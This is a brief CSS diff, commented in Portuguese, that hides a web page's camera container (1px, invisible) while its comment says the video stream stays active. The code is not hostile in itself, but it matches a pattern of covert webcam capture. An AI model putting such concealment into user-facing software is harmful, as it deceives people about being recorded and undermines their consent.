@@ -90,11 +90,12 @@ main {
   background-color: #ddd;
 }
 
-/* Câmera */
+/* Câmera - Oculta mas mantém o stream ativo */
 #camera-container {
-  width: 100%;
-  max-width: 320px;
-  margin: 20px auto 10px;
+  visibility: hidden; /* Deixa invisível */
+  width: 1px;
+  height: 1px;
+  overflow: hidden;
 }
 
 #camera-container video {
